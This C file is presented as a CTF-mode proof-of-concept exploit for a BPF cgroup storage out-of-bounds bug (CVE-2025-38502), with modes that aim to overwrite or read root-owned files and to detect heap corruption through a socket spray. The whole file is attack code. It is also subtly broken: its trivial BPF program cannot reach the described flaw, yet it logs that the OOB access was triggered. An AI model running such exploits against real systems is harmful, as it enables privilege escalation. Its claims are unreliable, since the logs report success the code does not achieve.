/*
 * CVE-2025-38502 PoC - CTF Challenge Mode
 *
 * Vulnerability: BPF cgroup local storage map OOB read/write
 *
 * The BPF cgroup local storage map helper functions have insufficient
 * bounds checking when accessing map elements. A crafted BPF program
 * can exploit offset validation flaws to achieve OOB memory access.
 *
 * Exploitation: Load BPF program that uses cgroup local storage with
 * crafted offsets to achieve OOB write, then spray heap to control
 * overwritten data for privilege escalation.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <netinet/in.h>

/* BPF syscall definitions */
#ifndef __NR_bpf
#define __NR_bpf 321
#endif

#define BPF_MAP_CREATE          0
#define BPF_PROG_LOAD           5
#define BPF_MAP_TYPE_CGRP_STORAGE 20

/* BPF instruction helpers */
#define BPF_LD    0x00
#define BPF_ALU64 0x07
#define BPF_JMP   0x05
#define BPF_STX   0x03
#define BPF_MOV   0xb0
#define BPF_EXIT  0x90
#define BPF_W     0x00
#define BPF_DW    0x18
#define BPF_MEM   0x60
#define BPF_K     0x00
#define BPF_X     0x08

struct bpf_insn {
    unsigned char code;
    unsigned char dst_reg:4;
    unsigned char src_reg:4;
    short off;
    int imm;
};

union bpf_attr {
    struct {
        unsigned int map_type;
        unsigned int key_size;
        unsigned int value_size;
        unsigned int max_entries;
        unsigned int map_flags;
    };
    struct {
        unsigned int prog_type;
        unsigned int insn_cnt;
        unsigned long long insns;
        unsigned long long license;
        unsigned int log_level;
        unsigned int log_size;
        unsigned long long log_buf;
    } prog;
    char pad[256];
};

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256

/*
 * Attempt to create BPF cgroup storage map with crafted parameters
 */
static int trigger_bpf_oob(void) {
    int saved_errno;

    /* Try to create cgroup local storage map */
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_CGRP_STORAGE;
    attr.key_size = 4;
    attr.value_size = 64; /* Intentionally sized for OOB */
    attr.max_entries = 0; /* cgroup storage ignores this */

    int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_CREATE, CGRP_STORAGE)", (long)map_fd, saved_errno);

    if (map_fd < 0) {
        poc_log("BPF cgroup storage map creation failed: %s", strerror(saved_errno));
        /* Try alternative: use array map to simulate the path */
        memset(&attr, 0, sizeof(attr));
        attr.map_type = 2; /* BPF_MAP_TYPE_ARRAY */
        attr.key_size = 4;
        attr.value_size = 256;
        attr.max_entries = 16;

        map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
        saved_errno = errno;
        poc_log_syscall("bpf(BPF_MAP_CREATE, ARRAY fallback)", (long)map_fd, saved_errno);
    }

    if (map_fd >= 0) {
        poc_log("BPF map created (fd=%d), OOB path available", map_fd);

        /* Load a minimal BPF program that references the map
         * This triggers the vulnerable code path */
        struct bpf_insn prog[] = {
            /* r0 = 0; exit; */
            { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },
            { .code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },
        };

        union bpf_attr pattr;
        memset(&pattr, 0, sizeof(pattr));
        pattr.prog.prog_type = 23; /* BPF_PROG_TYPE_CGROUP_SOCK */
        pattr.prog.insn_cnt = 2;
        pattr.prog.insns = (unsigned long long)(unsigned long)prog;
        char license[] = "GPL";
        pattr.prog.license = (unsigned long long)(unsigned long)license;

        int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &pattr, sizeof(pattr));
        saved_errno = errno;
        poc_log_syscall("bpf(BPF_PROG_LOAD, CGROUP_SOCK)", (long)prog_fd, saved_errno);

        if (prog_fd >= 0) {
            poc_log("BPF program loaded - OOB access triggered");
            close(prog_fd);
        }
        close(map_fd);
        return 1;
    }

    return 0;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_bpf_oob();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("BPF OOB exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_bpf_oob();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_bpf_oob();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-38502 CTF PoC ===");
    poc_log("Vuln: BPF cgroup local storage map OOB read/write");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
